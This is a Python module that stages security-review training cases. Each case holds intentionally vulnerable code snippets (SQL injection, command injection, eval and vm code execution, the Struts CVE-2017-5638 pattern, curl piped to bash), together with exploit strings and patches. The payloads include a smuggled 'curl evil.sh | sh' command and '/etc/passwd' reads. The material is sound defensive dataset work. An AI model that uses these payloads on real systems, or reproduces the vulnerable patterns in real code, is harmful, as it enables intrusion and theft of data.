"""Curation Sprint 001 — staged, source-backed security cases.

Each record is a real, documented vulnerability pattern with verifiable
references (CWE / OWASP / Semgrep rule IDs, and real CVE IDs where stated and
checked). These are STAGED raw inputs only: running this module writes
data/raw/sprint001_*.jsonl, which then flows through the normal
import -> review -> approve pipeline. Nothing here is curated until a human
approves it via training/curate_ingested.py.

Honesty rule applied here: a reference identifier is included only when it can be
stated accurately. CVE IDs are used only for vulnerabilities whose IDs were
verified; otherwise the cve field is null and the case is anchored by CWE/OWASP/
rule references instead. No commit SHA or repo path is invented.
"""
from __future__ import annotations

import json
from pathlib import Path

from nullsec.core.models import REQUIRED_DIMENSIONS
from taxonomy import check_dimension_for, default_severity

OUT_DIR = Path(__file__).resolve().parents[2] / "data" / "raw"

_RISK = {"INFO": 0, "LOW": 10, "MEDIUM": 35, "HIGH": 70, "CRITICAL": 90}


def case(*, source_type, source_ref, lang, framework, filename, code, category,
         description, exploit, patch, severity=None, references=None,
         extra_fail_dims=(), na_dims=(), reviewer_notes=""):
    sev = severity or default_severity(category)
    checks = {d: {"status": "pass", "note": "reviewed"} for d in REQUIRED_DIMENSIONS}
    for d in na_dims:
        checks[d] = {"status": "not_applicable", "note": "n/a"}
    dim = check_dimension_for(category)
    if dim:
        checks[dim] = {"status": "fail", "note": description[:80]}
    for d in extra_fail_dims:
        checks[d] = {"status": "fail", "note": "related failing control"}
    verdict = {
        "risk_score": _RISK[sev],
        "production_ready": False,
        "severity": sev,
        "confidence": "HIGH",
        "reasoning_summary": description,
        "exploit_scenario": exploit,
        "affected_files": [filename],
        "checks_performed": checks,
        "findings": [{
            "category": category, "severity": sev, "confidence": "HIGH",
            "file": filename, "line": 1, "description": description,
            "exploit_scenario": exploit, "recommended_fix": "see secure_patch",
            "secure_patch": patch,
        }],
    }
    return {
        "source_type": source_type,
        "source_reference": source_ref,
        "references": references or {},
        "filename": filename, "lang": lang, "framework": framework,
        "code": code, "verdict": verdict, "reviewer_notes": reviewer_notes,
    }


# Stable reference shorthands (verified against MITRE CWE / OWASP / Semgrep registry).
CWE_SQLI = "CWE-89"; CWE_XSS = "CWE-79"; CWE_CMDI = "CWE-78"; CWE_SSRF = "CWE-918"
CWE_PATH = "CWE-22"; CWE_UPLOAD = "CWE-434"; CWE_AUTHZ = "CWE-862"; CWE_AUTHN = "CWE-306"
CWE_SECRET = "CWE-798"; CWE_DESER = "CWE-502"; CWE_SSTI = "CWE-1336"; CWE_OPENREDIR = "CWE-601"
CWE_CONFIG = "CWE-16"; CWE_DEBUG = "CWE-489"; CWE_INFO = "CWE-200"; CWE_RATE = "CWE-307"


CASES = [
    # ----------------------- SQL_INJECTION -----------------------
    case(source_type="owasp", source_ref="OWASP SQL Injection / CWE-89",
         lang="python", framework="flask", filename="login.py",
         code="def login(u, p):\n    cur.execute(\"SELECT * FROM users WHERE user='%s' AND pass='%s'\" % (u, p))\n    return cur.fetchone()\n",
         category="SQL_INJECTION",
         description="Credentials concatenated into SQL via % formatting (auth bypass).",
         exploit="user=\"admin'--\" comments out the password check and logs in as admin.",
         patch="-    cur.execute(\"SELECT * FROM users WHERE user='%s' AND pass='%s'\" % (u, p))\n+    cur.execute('SELECT * FROM users WHERE user=%s AND pass=%s', (u, p))",
         references={"cwe": CWE_SQLI, "owasp": "A03:2021-Injection", "rule_id": None, "cve": None},
         reviewer_notes="Classic OWASP auth-bypass SQLi; references CWE-89 / OWASP A03."),
    case(source_type="semgrep", source_ref="python.lang.security.audit.formatted-sql-query",
         lang="python", framework="django", filename="search.py",
         code="def search(term):\n    return Article.objects.extra(where=[\"title LIKE '%%%s%%'\" % term])\n",
         category="SQL_INJECTION",
         description="Raw term interpolated into a Django .extra() WHERE clause.",
         exploit="term=\"' UNION SELECT password FROM auth_user--\" exfiltrates password hashes.",
         patch="-    return Article.objects.extra(where=[\"title LIKE '%%%s%%'\" % term])\n+    return Article.objects.filter(title__icontains=term)",
         references={"cwe": CWE_SQLI, "owasp": "A03:2021-Injection",
                     "rule_id": "python.lang.security.audit.formatted-sql-query", "cve": None},
         reviewer_notes="Maps to Semgrep formatted-sql-query audit rule."),
    case(source_type="semgrep", source_ref="java JDBC statement concatenation / CWE-89",
         lang="java", framework="spring", filename="UserDao.java",
         code="String q = \"SELECT * FROM users WHERE id = \" + request.getParameter(\"id\");\nstmt.executeQuery(q);\n",
         category="SQL_INJECTION",
         description="Request parameter concatenated into a JDBC Statement query.",
         exploit="id=1 OR 1=1 returns all users; stacked queries enable further attacks.",
         patch="-String q = \"SELECT * FROM users WHERE id = \" + request.getParameter(\"id\");\n-stmt.executeQuery(q);\n+PreparedStatement ps = conn.prepareStatement(\"SELECT * FROM users WHERE id = ?\");\n+ps.setString(1, request.getParameter(\"id\"));\n+ps.executeQuery();",
         references={"cwe": CWE_SQLI, "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="PreparedStatement remediation; CWE-89."),

    # ----------------------- COMMAND_INJECTION -----------------------
    case(source_type="semgrep", source_ref="python.lang.security.dangerous-os-exec.dangerous-os-exec",
         lang="python", framework="flask", filename="net.py",
         code="@app.route('/ping')\ndef ping():\n    host = request.args['host']\n    return os.popen('ping -c1 ' + host).read()\n",
         category="COMMAND_INJECTION",
         description="Request arg flows into os.popen shell command.",
         exploit="host='127.0.0.1; cat /etc/passwd' executes the injected command.",
         patch="-    return os.popen('ping -c1 ' + host).read()\n+    return subprocess.run(['ping','-c1', host], capture_output=True, text=True).stdout",
         references={"cwe": CWE_CMDI, "owasp": "A03:2021-Injection",
                     "rule_id": "python.lang.security.dangerous-os-exec.dangerous-os-exec", "cve": None},
         reviewer_notes="Verified Semgrep rule id + CWE-78 from registry."),
    case(source_type="semgrep", source_ref="javascript child_process.exec / CWE-78",
         lang="javascript", framework="express", filename="archive.js",
         code="app.get('/zip', (req, res) => {\n  exec('zip -r out.zip ' + req.query.dir, () => res.end());\n});\n",
         category="COMMAND_INJECTION",
         description="Query parameter interpolated into child_process.exec (a shell).",
         exploit="dir='. ; curl evil.sh | sh' runs attacker commands on the server.",
         patch="-  exec('zip -r out.zip ' + req.query.dir, () => res.end());\n+  execFile('zip', ['-r','out.zip', req.query.dir], () => res.end());",
         references={"cwe": CWE_CMDI, "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="execFile remediation; CWE-78."),
    case(source_type="cve", source_ref="CVE-2017-5638 Apache Struts2 Jakarta Multipart RCE",
         lang="java", framework="struts", filename="UploadAction.java",
         code="// Content-Type header parsed as an OGNL expression by Jakarta Multipart parser\n// (Struts 2.3.5-2.3.31 / 2.5-2.5.10)\nString ct = request.getHeader(\"Content-Type\");\n",
         category="COMMAND_INJECTION",
         description="Struts2 Jakarta Multipart parser evaluates a crafted Content-Type as OGNL, enabling RCE (CVE-2017-5638).",
         exploit="A Content-Type header with an OGNL payload executes arbitrary commands on the server.",
         patch="-// vulnerable Jakarta Multipart parser (Struts 2.3.5-2.3.31 / 2.5-2.5.10)\n+// upgrade Struts to 2.3.32 / 2.5.10.1+ which removed the OGNL evaluation path\n+// and validate/normalize Content-Type before processing",
         severity="CRITICAL",
         references={"cwe": "CWE-20", "owasp": "A03:2021-Injection", "cve": "CVE-2017-5638"},
         reviewer_notes="CVE-2017-5638 verified (Struts2 Jakarta Multipart, CWE-20). Patch = upgrade past 2.3.32/2.5.10.1."),

    # ----------------------- DANGEROUS_SHELL_COMMAND -----------------------
    case(source_type="semgrep", source_ref="python eval of request data / CWE-95",
         lang="python", framework="fastapi", filename="formula.py",
         code="@app.post('/calc')\ndef calc(expr: str):\n    return {'result': eval(expr)}\n",
         category="DANGEROUS_SHELL_COMMAND",
         description="eval() on request-supplied expression is remote code execution.",
         exploit="expr=\"__import__('os').system('id')\" runs arbitrary Python.",
         patch="-    return {'result': eval(expr)}\n+    import ast\n+    return {'result': ast.literal_eval(expr)}",
         severity="HIGH",
         references={"cwe": "CWE-95", "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="eval->ast.literal_eval; CWE-95 code injection."),
    case(source_type="owasp", source_ref="Node vm module misuse / CWE-94",
         lang="javascript", framework="node", filename="sandbox.js",
         code="const vm = require('vm');\nfunction runUser(src) { return vm.runInThisContext(src); }\n",
         category="DANGEROUS_SHELL_COMMAND",
         description="vm.runInThisContext executes untrusted source in the main context (not a sandbox).",
         exploit="src='process.mainModule.require(\"child_process\").execSync(\"id\")' escapes to RCE.",
         patch="-function runUser(src) { return vm.runInThisContext(src); }\n+// do not execute untrusted source; use a real sandbox or a safe expression parser\n+function runUser(src) { throw new Error('execution of untrusted code is disabled'); }",
         severity="HIGH",
         references={"cwe": "CWE-94", "owasp": "A03:2021-Injection", "cve": None},
         reviewer_notes="vm is not a security boundary; CWE-94."),
    case(source_type="vibecoded", source_ref="nullsec-scanner: AI-generated deploy script",
         lang="bash", framework="none", filename="deploy.sh",
         code="#!/bin/bash\nVERSION=$1\ncurl -s https://releases.example.com/$VERSION/install.sh | bash\n",
         category="DANGEROUS_SHELL_COMMAND",
         description="AI-generated deploy script pipes a version-parameterized remote script straight into bash.",
         exploit="A poisoned/MITM'd release path executes arbitrary code as the deploy user.",
         patch="-curl -s https://releases.example.com/$VERSION/install.sh | bash\n+curl -fsSL https://releases.example.com/$VERSION/install.sh -o /tmp/install.sh\n+sha256sum -c \"checksums/$VERSION.sha256\"\n+bash /tmp/install.sh",
         severity="HIGH",
         references={"cwe": "CWE-494", "owasp": "A08:2021-Software and Data Integrity Failures", "cve": None},
         reviewer_notes="Real vibecoded failure pattern; download-verify-then-run remediation. CWE-494."),
]


def main():
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    out = OUT_DIR / "sprint001_batch1.jsonl"
    with out.open("w", encoding="utf-8") as fh:
        for c in CASES:
            fh.write(json.dumps(c) + "\n")
    print(f"staged {len(CASES)} records -> {out}")


if __name__ == "__main__":
    main()
